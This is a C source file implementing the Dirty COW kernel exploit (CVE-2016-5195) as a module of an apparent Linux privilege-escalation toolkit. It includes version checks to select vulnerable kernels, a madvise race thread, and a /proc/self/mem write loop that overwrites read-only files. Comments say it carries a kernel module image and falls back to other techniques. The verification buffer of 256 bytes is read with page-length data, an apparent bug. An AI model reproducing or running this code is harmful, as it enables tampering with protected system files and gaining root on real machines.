/* CVE-2016-5195 "Dirty COW"
 *
 * mm/gup: race in the COW path of get_user_pages
 *
 * A private read-only mapping of a file is raced against a write through
 * /proc/self/mem. The write takes the COW slow path while MADV_DONTNEED
 * drops the private copy, and the kernel ends up writing into the file's
 * page cache instead of a private page. The file needs only to be readable.
 *
 * Kernel range: introduced 2.6.22, fixed in 4.8.3, 4.7.9 and 4.4.26, so
 * every 4.x release before those points is vulnerable (and 3.x too). This is
 * the only page-cache write primitive available on 4.x: CopyFail, the XFRM
 * trick and Dirty Pipe all need later code.
 *
 * No page-align or size limit applies here, so it can carry the KO image.
 * It is a race, so every page is read back; the caller falls back to XFRM if
 * a page refuses to land.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/utsname.h>

#include "pagecache.h"

struct dc_race {
    void          *addr;
    size_t         len;
    volatile int   stop;
};

static void *dc_madvise_thread(void *arg)
{
    struct dc_race *r = arg;

    while (!r->stop)
        madvise(r->addr, r->len, MADV_DONTNEED);
    return NULL;
}

static int dc_version_ok(void)
{
    struct utsname u;
    int a = 0, b = 0, c = 0;

    if (uname(&u) != 0)
        return -1;
    if (sscanf(u.release, "%d.%d.%d", &a, &b, &c) != 3)
        return -1;

    if (a < 4)                          /* 2.6.22 .. 3.x */
        return 0;
    if (a > 4)
        return -1;
    if (b < 4)
        return 0;                       /* 4.0 .. 4.3 */
    if (b == 4)
        return c < 26 ? 0 : -1;
    if (b < 7)
        return 0;                       /* 4.5, 4.6 */
    if (b == 7)
        return c < 9 ? 0 : -1;
    if (b == 8)
        return c < 3 ? 0 : -1;
    return -1;
}

int pcw_dirtycow_probe(void)
{
    return dc_version_ok();
}

/* Race one page. in_page + len must stay inside the page. */
static int dc_patch_page(int fd, off_t page_off, size_t page_len,
                         size_t in_page, const uint8_t *data, size_t len)
{
    struct dc_race race;
    pthread_t th;
    uint8_t check[256];
    void *map;
    int memfd;
    int rc = -1;

    map = mmap(NULL, page_len, PROT_READ, MAP_PRIVATE, fd, page_off);
    if (map == MAP_FAILED)
        return -1;

    memfd = open("/proc/self/mem", O_RDWR | O_CLOEXEC);
    if (memfd < 0) {
        munmap(map, page_len);
        return -1;
    }

    race.addr = map;
    race.len  = page_len;
    race.stop = 0;
    if (pthread_create(&th, NULL, dc_madvise_thread, &race) != 0) {
        close(memfd);
        munmap(map, page_len);
        return -1;
    }

    for (int i = 0; i < 4000 && rc < 0; i++) {
        ssize_t n = pwrite(memfd, data, len,
                           (off_t)(uintptr_t)map + (off_t)in_page);
        if (n == (ssize_t)len &&
            pread(fd, check, len, page_off + (off_t)in_page) == (ssize_t)len &&
            memcmp(check, data, len) == 0)
            rc = 0;
        else
            sched_yield();
    }

    race.stop = 1;
    pthread_join(th, NULL);
    close(memfd);
    munmap(map, page_len);
    return rc;
}

int pcw_dirtycow_write_fd(int fd, off_t off, const void *data, size_t len)
{
    const uint8_t *p = data;
    long ps = sysconf(_SC_PAGESIZE);

    if (len == 0)
        return dc_version_ok();
    if (ps <= 0)
        return -1;

    while (len > 0) {
        off_t  page_off = off & ~(off_t)(ps - 1);
        size_t in_page  = (size_t)(off - page_off);
        size_t room     = (size_t)ps - in_page;
        size_t n        = len < room ? len : room;

        if (dc_patch_page(fd, page_off, (size_t)ps, in_page, p, n) < 0)
            return -1;

        off += (off_t)n;
        p   += n;
        len -= n;
    }
    return 0;
}
